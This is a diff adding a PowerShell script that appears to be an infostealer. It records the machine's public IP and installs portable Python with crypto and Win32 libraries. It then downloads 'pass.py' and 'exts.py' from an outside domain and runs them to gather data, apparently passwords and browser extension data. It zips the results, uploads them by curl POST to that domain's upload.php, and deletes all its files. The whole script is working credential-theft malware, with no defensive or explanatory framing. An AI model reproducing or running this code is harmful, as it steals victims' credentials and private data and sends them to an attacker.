@@ -1,0 +1,62 @@
+$availableDrives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Root
+$selectedDrive = $availableDrives | Where-Object { $_ -match "^[A-Z]:\\$" } | Select-Object -First 1
+if (-not $selectedDrive) { exit }
+
+$tempRoot = "$selectedDrive\Temp"
+if (-not (Test-Path $tempRoot)) { New-Item -ItemType Directory -Path $tempRoot | Out-Null }
+
+$lockFile = "$tempRoot\script.lock"
+if (Test-Path $lockFile) { exit }
+New-Item -ItemType File -Path $lockFile -Force | Out-Null
+
+try { $ipAddress = (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing).Content.Trim() } catch { $ipAddress = "unknown-ip" }
+if (-not $ipAddress) { $ipAddress = "unknown-ip" }
+$ipAddress = $ipAddress -replace "[:\\/<>|?*]", "-"
+
+$zipPath = "$tempRoot\$ipAddress.zip"
+$tempFolder = "$tempRoot\CollectedData"
+$pythonDir = "$tempRoot\PortablePython"
+$passPath = "$tempRoot\pass.py"
+$extsPath = "$tempRoot\exts.py"
+
+if (Test-Path $tempFolder) { Remove-Item -Recurse -Force $tempFolder }
+New-Item -ItemType Directory -Path $tempFolder | Out-Null
+
+$pythonZip = "$env:TEMP\python-embed.zip"
+Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.8/python-3.11.8-embed-amd64.zip" -OutFile $pythonZip
+Expand-Archive -Path $pythonZip -DestinationPath $pythonDir -Force
+Remove-Item $pythonZip
+
+$pfile = Join-Path $pythonDir "python311._pth"
+(Get-Content $pfile) -replace '#import site', 'import site' | Set-Content $pfile
+
+Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile "$pythonDir\get-pip.py"
+& "$pythonDir\python.exe" "$pythonDir\get-pip.py"
+Remove-Item "$pythonDir\get-pip.py"
+
+& "$pythonDir\python.exe" -m pip install pycryptodome pypiwin32
+
+Invoke-WebRequest "https://dskfsfsdf.com/pass.py" -OutFile $passPath
+Invoke-WebRequest "https://dskfsfsdf.com/exts.py" -OutFile $extsPath
+
+& "$pythonDir\python.exe" "$passPath" "$tempFolder"
+& "$pythonDir\python.exe" "$extsPath" "$tempFolder"
+
+if (Test-Path $zipPath) { Remove-Item -Force $zipPath }
+Compress-Archive -Path "$tempFolder\*" -DestinationPath $zipPath -Force
+
+$uploadUrl = "https://dskfsfsdf.com/upload.php"
+
+try {
+    $command = "curl.exe -X POST $uploadUrl -F `"file=@$zipPath`""
+    iex $command
+    Write-Host "Файл загружен успешно"
+} catch {
+    Write-Host "Ошибка при загрузке: $_"
+}
+
+Remove-Item -Recurse -Force $tempFolder
+Remove-Item -Force $zipPath
+Remove-Item -Force $passPath
+Remove-Item -Force $extsPath
+Remove-Item -Recurse -Force $pythonDir
